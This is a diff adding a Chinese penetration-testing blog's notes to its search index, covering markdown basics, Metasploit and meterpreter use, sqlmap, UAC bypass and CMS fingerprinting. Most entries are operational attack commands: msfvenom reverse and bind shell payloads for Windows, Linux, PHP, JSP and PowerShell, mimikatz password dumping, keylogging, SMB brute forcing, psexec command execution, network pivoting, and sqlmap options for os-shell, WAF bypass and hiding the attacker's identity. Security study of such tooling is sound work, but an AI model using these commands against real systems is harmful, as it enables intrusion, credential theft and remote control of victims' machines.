+        <tag>提权</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>markdown 语法学习</title>
+    <url>/2020/02/10/markdown-%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0/</url>
+    <content><![CDATA[<h1 id="一级标题"><a href="#一级标题" class="headerlink" title="一级标题"></a>一级标题</h1><h2 id="二级标题"><a href="#二级标题" class="headerlink" title="二级标题"></a>二级标题</h2><h3 id="三级标题"><a href="#三级标题" class="headerlink" title="三级标题"></a>三级标题</h3><p><strong>加粗</strong> <em>倾斜</em>  <strong><em>粗斜体</em></strong>  <del>删除线</del></p>
+<blockquote>
+<p>引用</p>
+<blockquote>
+<p>继续引用</p>
+</blockquote>
+</blockquote>
+<p>分割线</p>
+<hr>
+<p>图片：</p>
+<p><img src="https://i0.hdslb.com/bfs/article/1bc392a3b58e084b35598d5db20ced92a1428ac8.jpg@1320w_1180h.webp" alt="picture" title="乃爱~"></p>
+<p>超链接：</p>
+<p><a href="https://www.baidu.com" target="_blank" rel="noopener">百度，搜索滴神！</a></p>
+<p>无序列表：</p>
+<ul>
+<li>qwerasd</li>
+<li>asdfzxc</li>
+</ul>
+<p>有序列表：</p>
+<ol>
+<li>啊</li>
+<li>啊？</li>
+</ol>
+<p>嵌套列表：</p>
+<ul>
+<li>乌兹！<ul>
+<li>永远滴神！</li>
+</ul>
+</li>
+</ul>
+<ol>
+<li>乌兹！<ol>
+<li>别克斯坦</li>
+</ol>
+</li>
+</ol>
+<p>表格：</p>
+<table>
+<thead>
+<tr>
+<th>id</th>
+<th align="center">name</th>
+<th align="right">password</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td align="center">user</td>
+<td align="right">1234</td>
+</tr>
+</tbody></table>
+<p>代码：</p>
+<p><code>print(&quot;hello&quot;)</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def hello():</span><br><span class="line">	print(&quot;hello&quot;)</span><br><span class="line">hello()</span><br></pre></td></tr></table></figure>
+]]></content>
+      <tags>
+        <tag>基础学习</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>msf之meterpreter</title>
+    <url>/2020/03/22/msf%E4%B9%8Bmeterpreter/</url>
+    <content><![CDATA[<h1 id="明文密码和HASH获取"><a href="#明文密码和HASH获取" class="headerlink" title="明文密码和HASH获取"></a>明文密码和HASH获取</h1><ul>
+<li>绕过UAC之后，如果目标已经登录过，没有关机或者没有重启后没有用户登录的话，是可以直接从内存里面获取到机器的明文密码。</li>
+</ul>
+<h2 id="具体操作"><a href="#具体操作" class="headerlink" title="具体操作"></a>具体操作</h2><ul>
+<li>绕过UAC，反弹获得meterpreter以后，首先执行hashdump。</li>
+<li>加载模块，load mimikatz</li>
+<li>执行wdigest，获取明文密码。如果不行，尝试执行kerberos或者msv命令</li>
+</ul>
+<h1 id="进程迁移"><a href="#进程迁移" class="headerlink" title="进程迁移"></a>进程迁移</h1><h2 id="手动迁移"><a href="#手动迁移" class="headerlink" title="手动迁移"></a>手动迁移</h2><ul>
+<li>监听的时候 set exitonsession false，exploit -j -z，反弹的时候就不会退出监听。</li>
+<li>sessions查看会话，sessions+id打开会话。</li>
+<li>使用ps命令列出所有进程，getpid查看当前exp进程pid，一般进程都选择迁移到任务管理器进程。</li>
+<li>执行migrate -N explorer.exe。或migrate -P pid。  迁移完成后原进程会自动退出。高权限可以往低权限迁移，低权限不能往高权限迁。</li>
+</ul>
+<h2 id="上线自动迁移"><a href="#上线自动迁移" class="headerlink" title="上线自动迁移"></a>上线自动迁移</h2><ul>
+<li>执行exploit之前设置 set autorunscript migrate - n explorer.exe</li>
+<li>或者执行set AutoRunScript migrate -f，msf会自动选择一个进程进行迁移</li>
+</ul>
+<h1 id="各类操作"><a href="#各类操作" class="headerlink" title="各类操作"></a>各类操作</h1><h2 id="键盘记录"><a href="#键盘记录" class="headerlink" title="键盘记录"></a>键盘记录</h2><ul>
+<li>keyscan_start</li>
+<li>keyscan_dump</li>
+<li>keyboard_send 对目标机器进行键盘输入</li>
+</ul>
+<h2 id="屏幕截图"><a href="#屏幕截图" class="headerlink" title="屏幕截图"></a>屏幕截图</h2><ul>
+<li>screenshot</li>
+</ul>
+<h2 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h2><ul>
+<li>上传：upload /root/xf.php c:\xf.php</li>
+<li>下载： download c:/xf.php /root/1.php</li>
+<li>cat 文件名 查看文件</li>
+<li>edit c:/xf.php 编辑文件</li>
+<li>cd c: / 切换工作目录</li>
+</ul>
+<h2 id="加载语言终端"><a href="#加载语言终端" class="headerlink" title="加载语言终端"></a>加载语言终端</h2><ul>
+<li>load -l 列出能加载的语言终端</li>
+<li>load powershell。加载</li>
+<li>具体操作在官网看看。</li>
+</ul>
+<h1 id="添加路由"><a href="#添加路由" class="headerlink" title="添加路由"></a>添加路由</h1><p>##获取网段</p>
+<ul>
+<li>shell  –&gt;  ipconfig</li>
+<li>run get_local_subnets</li>
+<li>route list</li>
+</ul>
+<h2 id="添加路由-1"><a href="#添加路由-1" class="headerlink" title="添加路由"></a>添加路由</h2><p>把自己的机器添加进目标主机路由才能对内网进行操作</p>
+<ul>
+<li>run autoroute -s 192.168.0.0</li>
+<li>backgroup –&gt; route add 192.168.0.0 255.255.255.0 1</li>
+<li>arp扫描 run arp_scanner -r 192.168.0.0/24</li>
+</ul>
+<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><ul>
+<li>search portscan</li>
+<li>use auxiliary/scanner/portscan/syn  （use 5）</li>
+<li>setg rhost 192.168.0.0/24 (setg设置全局参数)</li>
+<li>set threads 20 </li>
+<li>set rhost Interrupt: use the quit</li>
+<li>set ports 445 </li>
+<li>exploit</li>
+</ul>
+<h1 id="SMB密码爆破"><a href="#SMB密码爆破" class="headerlink" title="SMB密码爆破"></a>SMB密码爆破</h1><ul>
+<li>首先扫描开放了445端口的主机</li>
+<li>use auxiliary/scanner/smb/smb_login</li>
+<li>set smbuser administrator   (set USER_FILE /root/user.dic)</li>
+<li>set smbpass admin  (set USERPASS_FILE /root/pass.dic)</li>
+<li>set rhosts file:/root/host.dic</li>
+<li>exploit</li>
+</ul>
+<h1 id="远程命令执行"><a href="#远程命令执行" class="headerlink" title="远程命令执行"></a>远程命令执行</h1><ul>
+<li>search psxec</li>
+<li>use auxiliary/admin/smb/psexec_command</li>
+<li>set command whoami</li>
+<li>set rhosts 192.168.0.19</li>
+<li>set smbuser administrator</li>
+<li>set smbpass admin</li>
+<li>exploit</li>
+</ul>
+<h1 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h1><ul>
+<li><p>一般应用在无法直接连接某个端口的情况下</p>
+</li>
+<li><p>portfwd add -l 6666 -p 3389 -r 127.0.0.1(也可换成内网其他主机ip)</p>
+<p>将目标机器的3389端口转发到装了msf的vps的6666端口上</p>
+</li>
+<li><p>转发完之后删除  add改成delete</p>
+</li>
+</ul>
+<h1 id="socks代理"><a href="#socks代理" class="headerlink" title="socks代理"></a>socks代理</h1><ul>
+<li>不支持ICMP和ARP协议。</li>
+<li>socks5比socks4a支持的协议更多</li>
+</ul>
+<h2 id="具体操作-1"><a href="#具体操作-1" class="headerlink" title="具体操作"></a>具体操作</h2><ul>
+<li>首先添加路由关联到session上</li>
+<li>search socks</li>
+<li>use auxiliary/server/socks4a</li>
+<li>set STVHOST 127.0.0.1</li>
+<li>set SRVPOST  10808</li>
+<li>exploit</li>
+<li>架设完socks代理以后，使用代理需要结合proxychains</li>
+<li>打开proxychains配置文件把端口改成刚才设置的</li>
+<li>proxychains nmap -Pn -sT 192.168.0.19</li>
+</ul>
+]]></content>
+      <tags>
+        <tag>msf</tag>
+        <tag>meterpreter</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>msf的七个模块</title>
+    <url>/2020/02/26/msf%E7%9A%84%E4%B8%83%E4%B8%AA%E6%A8%A1%E5%9D%97/</url>
+    <content><![CDATA[<h1 id="七个模块"><a href="#七个模块" class="headerlink" title="七个模块"></a>七个模块</h1><p>模块都是用use命令使用，用info查看模块详细信息。show options查看配置信息。search搜索模块。</p>
+<ol>
+<li><p>exploit</p>
+<p>漏洞利用模块。对漏洞进行利用。</p>
+<ul>
+<li>使用方法：use 模块名，show target 查看模块支持的目标环境</li>
+<li>先对目标进行扫描，能够利用再执行攻击模块</li>
+<li>反弹回的是cmdshell可以更改payload返回一个meterpreter</li>
+</ul>
+</li>
+<li><p>payloads</p>
+<p>攻击载荷模块。可以执行反弹代码，添加用户等攻击。</p>
+<ol>
+<li><p>正向payload：会被防火墙拦截</p>
+<ul>
+<li><p>攻击者去连接目标服务器</p>
+</li>
+<li><p>使用场景：</p>
+<ul>
+<li>目标及其不给其他除特定端口外的端口出站</li>
+<li>目标处于深层网络，不能直接连通外网，其他机器开了防火墙，也不能通过其他机器连通，通过开着防火墙的机器端口转发达到穿透目的</li>
+</ul>
+</li>
+<li><p>案例：</p>
+<p>关闭防火墙：netsh firewall set opmode mode=disable</p>
+<ul>
+<li>msfvenom -p windows/meterpreter/bind_tcp LPORT=&lt;Attack Port&gt; -f exe &gt; /root/bind_xx.exe</li>
+<li>msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=&lt;Attack Port&gt; -f exe &gt;  /root/bind_xx.exe</li>
+<li>msfvenom -p windows/meterpreter/bind_tcp LPORT=&lt;Attack Port&gt; -f dll &gt; /root/bind_xx.dll</li>
+<li>msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=&lt;Attack Port&gt; -f dll &gt; /root/bind_xx.dll</li>
+<li>msfvenom -p linux/x64/meterpreter/bind_tcp LPORT=&lt;Attack Port&gt; -f elf &gt; /root/bind_xx.elf</li>
+<li>msfvenom -p linux/x86/meterpreter/bind_tcp LPORT=&lt;Attack Port&gt; -f elf &gt; /root/bind_xx.elf</li>
+</ul>
+</li>
+<li><p>连接：</p>
+<p>use exploit/multi/handler</p>
+<p>set payload windows/meterpreter/bind_tcp</p>
+<p>set rhost &lt;Attack IP&gt;</p>
+<p>exploit</p>
+</li>
+</ul>
+</li>
+<li><p>反向payload：只要免杀，端口填常用的80,，8080，443，53端口，可以穿透防火墙。</p>
+<ul>
+<li><p>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your<br>Port to Connect On&gt; -f exe &gt; shell.exe</p>
+<p>cat shell.php | pbcopy &amp;&amp; echo ‘&lt;?php ‘ | tr -d ‘n’&gt; shell.php &amp;&amp; pbpaste &gt;&gt;<br>shell.php</p>
+</li>
+<li><p>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your<br>Port to Connect On&gt; -f elf &gt; shell.elf</p>
+</li>
+<li><p>msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to<br>Connect On&gt; -f macho &gt; shell.macho</p>
+<p>webshell</p>
+</li>
+<li><p>msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port<br>to Connect On&gt; -f raw &gt; shell.php</p>
+</li>
+<li><p>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your<br>Port to Connect On&gt; -f asp &gt; shell.asp</p>
+</li>
+<li><p>msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to<br>Connect On&gt; -f raw\ &gt; shell.jsp</p>
+</li>
+<li><p>msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to<br>Connect On&gt; -f war &gt; shell.war</p>
+</li>
+<li><p>msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to<br>Connect On&gt; -f raw &gt; shell.py</p>
+</li>
+<li><p>msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to<br>Connect On&gt; -f raw &gt; shell.sh</p>
+</li>
+<li><p>msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to<br>Connect On&gt; -f raw &gt; shell.pl</p>
+</li>
+<li><p>msfvenom -p windows/x64/meterpreter_reverse_http LHOST=&lt;Your IP Address&gt; LPORT=<br>&lt;Your Port to Connect On&gt; -f psh &gt; shell.ps1<br>powershell.exe -ExecutionPolicy Bypass -File shell.ps1</p>
+</li>
+<li><p>msf接收：</p>
+<p>use exploit/multi/handler</p>
+<p>set PAYLOAD windows/meterpreter/reverse_tcp</p>
+<p>set LHOST 192.168.88.128</p>
+<p>set LPORT 4444</p>
+<p>set ExitOnSession false</p>
+<p>exploit -j -z</p>
+</li>
+<li><p>多个连接，用background放到后台，sessions查看存活的</p>
+</li>
+</ul>
+</li>
+</ol>
+</li>
+<li><p>auxiliary</p>
+<p>辅助模块。有端口扫描，存活探测，暴力破解等功能。</p>
+<p>常用模块：</p>
+<ul>
+<li><p>端口扫描</p>
+<p>auxiliary/scanner/portscan/ack //ACK防火墙扫描<br>auxiliary/scanner/portscan/ftpbounce //FTP跳端口扫描<br>auxiliary/scanner/portscan/syn //SYN端口扫描<br>auxiliary/scanner/portscan/tcp //TCP端口扫描<br>auxiliary/scanner/portscan/xmas //TCP-XMas端口扫描</p>
+</li>
+<li><p>版本扫描</p>
+<p>auxiliary/scanner/smb/smb_version<br>auxiliary/scanner/mssql/mssql_version<br>……</p>
+</li>
+<li><p>登录爆破</p>
+<p>auxiliary/scanner/mssql/mssql_login<br>auxiliary/scanner/smb/smb_login</p>
+</li>
+<li><p>其他</p>
+<p>auxiliary/scanner/mssql/mssql_hashdump //dump密码hash<br>auxiliary/scanner/smb/smb_ms17_010</p>
+</li>
+<li><p>注：</p>
+<p>set rhosts file:/root/ips.txt。批量设置目标ip</p>
+<p>​</p>
+</li>
+</ul>
+</li>
+<li><p>post</p>
+<p>后渗透模块。一般用于内网渗透。在meterpreter里面就可以使用</p>
+<p>run post/windows/gather/hashdump 获取密码hash，权限不够可以通过提权以后进行进程迁移。<br>run post/windows/gather/smart_hashdump<br>run post/multi/recon/local_exploit_suggester  提权<br>run post/multi/gather/firefox_creds<br>run post/multi/gather/ssh_creds<br>run post/windows/gather/enum_applications</p>
+</li>
+<li><p>encoders</p>
+<p>编码器模块。对payload进行编码加密，绕过杀软。</p>
+</li>
+<li><p>evasion</p>
+<p>躲避模块。躲避限制和杀软，免杀效果一般。</p>
+</li>
+<li><p>nops</p>
+<p>空指令模块。用以产生缓冲区填充的非操作性指令。</p>
+</li>
+</ol>
+<h1 id="连接数据库"><a href="#连接数据库" class="headerlink" title="连接数据库"></a>连接数据库</h1><h2 id="安装postgresql"><a href="#安装postgresql" class="headerlink" title="安装postgresql"></a>安装postgresql</h2><ul>
+<li>apt-get install postgresql -y</li>
+</ul>
+<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><ul>
+<li><p>修改postgres系统用户密码</p>
+<p>echo “postgres:password” | chpasswd</p>
+</li>
+<li><p>修改数据库默认用户postgres密码</p>
+<p>su postgres</p>
+<p>psql</p>
+<p>\password postgres</p>
+<p>\q</p>
+<p>exit</p>
+</li>
+<li><p>进入msfconsole后连接</p>
+<p>db_connect postgres:<a href="mailto:password@127.0.0.1">password@127.0.0.1</a>/msfdb</p>
+</li>
+<li><p>creds命令查看记录</p>
+</li>
+</ul>
+<h2 id="快捷连接"><a href="#快捷连接" class="headerlink" title="快捷连接"></a>快捷连接</h2><ul>
+<li>把 db_connect postgres:<a href="mailto:password@127.0.0.1">password@127.0.0.1</a>/msfdb 保存为文件connection.rc</li>
+<li>msfconsole -r connection.rc</li>
+</ul>
+]]></content>
+      <tags>
+        <tag>msf</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sql注入工具sqlmap的使用</title>
+    <url>/2020/02/20/sql%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7sqlmap%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
+    <content><![CDATA[<h1 id="注入Access"><a href="#注入Access" class="headerlink" title="注入Access"></a>注入Access</h1><ul>
+<li>一般小型网站使用asp+Access</li>
+<li>Access的特性，没办法直接获取表名列名，只能通过暴力猜解。一般使用sqlmap自带的就行。</li>
+<li>一个小技巧，在网站后台页面查看登录框源码可能会有字段名出现。</li>
+</ul>
+<h2 id="一般流程"><a href="#一般流程" class="headerlink" title="一般流程"></a>一般流程</h2><ul>
+<li>-u 检测注入，–dbs 爆数据库，–curren-db 获取当前数据库，–tables 爆表名，–columns 爆列名，–dump爆数据，–start  1 –stop 2 指定第一条到第二条数据，测试一两条数据，挖src的时候不容易出事。</li>
+<li>拿到密码解密后可以登录后台，无后台可以用这个密码尝试登录远程桌面或者ftp服务</li>
+</ul>
+<h1 id="注入mysql"><a href="#注入mysql" class="headerlink" title="注入mysql"></a>注入mysql</h1><ul>
+<li>基础用法同上</li>
+</ul>
+<h1 id="sqlmap参数"><a href="#sqlmap参数" class="headerlink" title="sqlmap参数"></a>sqlmap参数</h1><ul>
+<li>-r参数，从一个文件里获取一个HTTP请求，这样就不需要对cookie等请求头参数进行设置。sqlmap会自己对这些参数进行测试  。sqlmap -r 文件物理路径</li>
+<li>-m参数，从文件里一条一条获取url，一个一个进行检测。也就是批量检测</li>
+<li>–cookie参数，有时候登录以后的注入要带上cookie才能检测。</li>
+<li>–radom-agent参数，随机更改user-agent，防止被识别出来。</li>
+<li>–proxy参数，使用代理，不使用真实ip，可以翻墙，也可以隐藏身份。</li>
+<li>–delay参数，设置两次请求之间的延时。防止请求速度过快被封。–delay 1</li>
+<li>–tamper参数，指定绕过脚本，对注入语句进行变形以达到绕过waf的目的。</li>
+<li>–technique参数，指定注入技术，B布尔，E报错，U联合，S堆叠，T时间。</li>
+<li>–risk参数，提高测试等级，最高为3。会增加测试语句。</li>
+<li>–lever参数，增加被测试的语句。</li>
+<li>–string参数，在正常的页面找一个错误页面没有的字符串，添加到参数后面帮助识别注入。注：在填写搜索关键词的时候，一定要找出那些能够搜索出内容的关键词，比如你在实战中搜索dark5，但是网站没有关于dark5的文章内容，就不会出现正常的搜索结果，这样我们把注入语句加在dark5的后面时，是没有办法判断我们的SQL语句是否成功执行，就没有办法达到我们想要的结果了。还有的网站使用ajax，有时候真正的请求会在后面，需要通过抓包来判断</li>
+<li>*，这个参数用来指定测试语句位置，通常用于伪静态页面，也可用于正常页面增加效率。文章：<a href="https://www.cnblogs.com/ximotao/p/5870274.html" target="_blank" rel="noopener">https://www.cnblogs.com/ximotao/p/5870274.html</a></li>
+</ul>
+<h2 id="sqlmap进行oob注入"><a href="#sqlmap进行oob注入" class="headerlink" title="sqlmap进行oob注入"></a>sqlmap进行oob注入</h2><ul>
+<li>看看大佬写的过程  <a href="https://github.com/52stu/Notes_pub/blob/master/DNSlog%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8%E6%89%8B%E5%86%8C.md#sqlmap%E9%85%8D%E5%90%88dnslog" target="_blank" rel="noopener">https://github.com/52stu/Notes_pub/blob/master/DNSlog%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8%E6%89%8B%E5%86%8C.md#sqlmap%E9%85%8D%E5%90%88dnslog</a></li>
+</ul>
+<h2 id="注入伪静态"><a href="#注入伪静态" class="headerlink" title="注入伪静态"></a>注入伪静态</h2><ul>
+<li>用sqlmap在注入点处加个*即可</li>
+</ul>
+<h2 id="sqlmap处理高权限MSSQL注入"><a href="#sqlmap处理高权限MSSQL注入" class="headerlink" title="sqlmap处理高权限MSSQL注入"></a>sqlmap处理高权限MSSQL注入</h2><ul>
+<li>–curren-user 查看当前用户</li>
+<li>– is-dba 查看当前用户是否是数据库管理员权限用户</li>
+<li>–os-shell 使用存储过程，执行系统命令 </li>
+<li>–sql-shell 权限不够大时可以执行一些数据库命令</li>
+<li>–os-pwn –msf-path  /…/metasploit  配合msf</li>
+</ul>
+<h2 id="sqlmap处理高权限MYSQL注入"><a href="#sqlmap处理高权限MYSQL注入" class="headerlink" title="sqlmap处理高权限MYSQL注入"></a>sqlmap处理高权限MYSQL注入</h2><ul>
+<li>能爆出物理路径，基本流程同上</li>
+<li>没爆出路径只能自己爆破了</li>
+</ul>
+]]></content>
+      <tags>
+        <tag>sql注入</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>webshell管理工具</title>
     <url>/2020/02/21/webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7/</url>
     <content><![CDATA[<h1 id="中国菜刀（China-chopper）"><a href="#中国菜刀（China-chopper）" class="headerlink" title="中国菜刀（China chopper）"></a>中国菜刀（China chopper）</h1><h2 id="文件管理"><a href="#文件管理" class="headerlink" title="文件管理"></a>文件管理</h2><ul>
@@ -921,54 +1122,91 @@
       </tags>
   </entry>
   <entry>
-    <title>sql注入工具sqlmap的使用</title>
-    <url>/2020/02/20/sql%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7sqlmap%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
-    <content><![CDATA[<h1 id="注入Access"><a href="#注入Access" class="headerlink" title="注入Access"></a>注入Access</h1><ul>
-<li>一般小型网站使用asp+Access</li>
-<li>Access的特性，没办法直接获取表名列名，只能通过暴力猜解。一般使用sqlmap自带的就行。</li>
-<li>一个小技巧，在网站后台页面查看登录框源码可能会有字段名出现。</li>
+    <title>windows提权之UAC绕过</title>
+    <url>/2020/02/27/windows%E6%8F%90%E6%9D%83%E4%B9%8BUAC%E7%BB%95%E8%BF%87/</url>
+    <content><![CDATA[<h1 id="UAC"><a href="#UAC" class="headerlink" title="UAC"></a>UAC</h1><ul>
+<li>用户账户控制，是Windows Vista及更高版本操作系统中采用的一种控制机制。</li>
+<li>一旦程序设计系统更改或是特定任务，除非以管理员权限运行，否则这些操作都将被阻止，没有管理员权限将不能进行以下操作：<ul>
+<li>注册表修改</li>
+<li>加载设备驱动程序</li>
+<li>DLL注入</li>
+<li>修改系统时间</li>
+<li>修改用户账户控制</li>
+<li>修改受保护的目录</li>
+<li>计划任务</li>
 </ul>
-<h2 id="一般流程"><a href="#一般流程" class="headerlink" title="一般流程"></a>一般流程</h2><ul>
-<li>-u 检测注入，–dbs 爆数据库，–curren-db 获取当前数据库，–tables 爆表名，–columns 爆列名，–dump爆数据，–start  1 –stop 2 指定第一条到第二条数据，测试一两条数据，挖src的时候不容易出事。</li>
-<li>拿到密码解密后可以登录后台，无后台可以用这个密码尝试登录远程桌面或者ftp服务</li>
+</li>
+<li>参考文章：<a href="https://www.hackingarticles.in/multiple-ways-to-bypass-uac-using-metasploit/" target="_blank" rel="noopener">https://www.hackingarticles.in/multiple-ways-to-bypass-uac-using-metasploit/</a></li>
 </ul>
-<h1 id="注入mysql"><a href="#注入mysql" class="headerlink" title="注入mysql"></a>注入mysql</h1><ul>
-<li>基础用法同上</li>
+<h1 id="用msf绕过UAC限制"><a href="#用msf绕过UAC限制" class="headerlink" title="用msf绕过UAC限制"></a>用msf绕过UAC限制</h1><p>利用以下模块：search bypassuac</p>
+<ul>
+<li>exploit/windows/local/bypassuac </li>
+<li>exploit/windows/local/bypassuac_comhijack </li>
+<li>exploit/windows/local/bypassuac_eventvwr</li>
+<li>exploit/windows/local/bypassuac_fodhelper</li>
+<li>exploit/windows/local/bypassuac_injection</li>
+<li>exploit/windows/local/bypassuac_injection_winsxs </li>
+<li>exploit/windows/local/bypassuac_silentcleanup </li>
+<li>exploit/windows/local/bypassuac_sluihijack </li>
+<li>exploit/windows/local/bypassuac_vbs</li>
 </ul>
-<h1 id="sqlmap参数"><a href="#sqlmap参数" class="headerlink" title="sqlmap参数"></a>sqlmap参数</h1><ul>
-<li>-r参数，从一个文件里获取一个HTTP请求，这样就不需要对cookie等请求头参数进行设置。sqlmap会自己对这些参数进行测试  。sqlmap -r 文件物理路径</li>
-<li>-m参数，从文件里一条一条获取url，一个一个进行检测。也就是批量检测</li>
-<li>–cookie参数，有时候登录以后的注入要带上cookie才能检测。</li>
-<li>–radom-agent参数，随机更改user-agent，防止被识别出来。</li>
-<li>–proxy参数，使用代理，不使用真实ip，可以翻墙，也可以隐藏身份。</li>
-<li>–delay参数，设置两次请求之间的延时。防止请求速度过快被封。–delay 1</li>
-<li>–tamper参数，指定绕过脚本，对注入语句进行变形以达到绕过waf的目的。</li>
-<li>–technique参数，指定注入技术，B布尔，E报错，U联合，S堆叠，T时间。</li>
-<li>–risk参数，提高测试等级，最高为3。会增加测试语句。</li>
-<li>–lever参数，增加被测试的语句。</li>
-<li>–string参数，在正常的页面找一个错误页面没有的字符串，添加到参数后面帮助识别注入。注：在填写搜索关键词的时候，一定要找出那些能够搜索出内容的关键词，比如你在实战中搜索dark5，但是网站没有关于dark5的文章内容，就不会出现正常的搜索结果，这样我们把注入语句加在dark5的后面时，是没有办法判断我们的SQL语句是否成功执行，就没有办法达到我们想要的结果了。还有的网站使用ajax，有时候真正的请求会在后面，需要通过抓包来判断</li>
-<li>*，这个参数用来指定测试语句位置，通常用于伪静态页面，也可用于正常页面增加效率。文章：<a href="https://www.cnblogs.com/ximotao/p/5870274.html" target="_blank" rel="noopener">https://www.cnblogs.com/ximotao/p/5870274.html</a></li>
+<h2 id="具体操作"><a href="#具体操作" class="headerlink" title="具体操作"></a>具体操作</h2><ol>
+<li>获得session以后，先background把会话放到后台</li>
+<li>然后use bypassuac的模块</li>
+<li>set session id</li>
+<li>exploit以后会创建一个新的session</li>
+<li>session id+1 </li>
+</ol>
+]]></content>
+      <tags>
+        <tag>提权</tag>
+        <tag>msf</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>基于CMS的渗透</title>
+    <url>/2020/02/22/%E5%9F%BA%E4%BA%8ECMS%E7%9A%84%E6%B8%97%E9%80%8F/</url>
+    <content><![CDATA[<h1 id="识别"><a href="#识别" class="headerlink" title="识别"></a>识别</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><ul>
+<li>通过某项特征来识别，获得网站某个文件的MD5或者用正则表达式与字典里面的关键字进行匹配，如果匹配成功就说明这个站点是对应的CMS。</li>
 </ul>
-<h2 id="sqlmap进行oob注入"><a href="#sqlmap进行oob注入" class="headerlink" title="sqlmap进行oob注入"></a>sqlmap进行oob注入</h2><ul>
-<li>看看大佬写的过程  <a href="https://github.com/52stu/Notes_pub/blob/master/DNSlog%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8%E6%89%8B%E5%86%8C.md#sqlmap%E9%85%8D%E5%90%88dnslog" target="_blank" rel="noopener">https://github.com/52stu/Notes_pub/blob/master/DNSlog%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8%E6%89%8B%E5%86%8C.md#sqlmap%E9%85%8D%E5%90%88dnslog</a></li>
+<h2 id="国内在线指纹识别"><a href="#国内在线指纹识别" class="headerlink" title="国内在线指纹识别"></a>国内在线指纹识别</h2><ul>
+<li>云悉：<a href="http://www.yunsee.cn/" target="_blank" rel="noopener">http://www.yunsee.cn/</a></li>
+<li>潮汐：<a href="http://finger.tidesec.net/" target="_blank" rel="noopener">http://finger.tidesec.net/</a></li>
+<li>who am i ：<a href="http://whatweb.bugscaner.com/" target="_blank" rel="noopener">http://whatweb.bugscaner.com/</a></li>
 </ul>
-<h2 id="注入伪静态"><a href="#注入伪静态" class="headerlink" title="注入伪静态"></a>注入伪静态</h2><ul>
-<li>用sqlmap在注入点处加个*即可</li>
+<h2 id="国外在线指纹识别"><a href="#国外在线指纹识别" class="headerlink" title="国外在线指纹识别"></a>国外在线指纹识别</h2><ul>
+<li><a href="https://whatcms.org/" target="_blank" rel="noopener">https://whatcms.org/</a></li>
+<li><a href="https://cmsdetect.com/" target="_blank" rel="noopener">https://cmsdetect.com/</a></li>
+<li><a href="https://itrack.ru/whatcms/" target="_blank" rel="noopener">https://itrack.ru/whatcms/</a></li>
 </ul>
-<h2 id="sqlmap处理高权限MSSQL注入"><a href="#sqlmap处理高权限MSSQL注入" class="headerlink" title="sqlmap处理高权限MSSQL注入"></a>sqlmap处理高权限MSSQL注入</h2><ul>
-<li>–curren-user 查看当前用户</li>
-<li>– is-dba 查看当前用户是否是数据库管理员权限用户</li>
-<li>–os-shell 使用存储过程，执行系统命令 </li>
-<li>–sql-shell 权限不够大时可以执行一些数据库命令</li>
-<li>–os-pwn –msf-path  /…/metasploit  配合msf</li>
+<h2 id="其他方法"><a href="#其他方法" class="headerlink" title="其他方法"></a>其他方法</h2><ul>
+<li>robots.txt</li>
+<li>404报错</li>
+<li>….</li>
 </ul>
-<h2 id="sqlmap处理高权限MYSQL注入"><a href="#sqlmap处理高权限MYSQL注入" class="headerlink" title="sqlmap处理高权限MYSQL注入"></a>sqlmap处理高权限MYSQL注入</h2><ul>
-<li>能爆出物理路径，基本流程同上</li>
-<li>没爆出路径只能自己爆破了</li>
+<h1 id="如何渗透"><a href="#如何渗透" class="headerlink" title="如何渗透"></a>如何渗透</h1><p>因为这些cms都是开源的，安全工作者就会对这些源代码进审计（代码审计），很多CMS就会被爆出各种漏洞及其利用方式，我们只要把相应的请求发到到目标网站，就可成功利用。在搜索引擎上搜索相应漏洞即可。</p>
+<h1 id="DEDECMS（织梦）"><a href="#DEDECMS（织梦）" class="headerlink" title="DEDECMS（织梦）"></a>DEDECMS（织梦）</h1><ul>
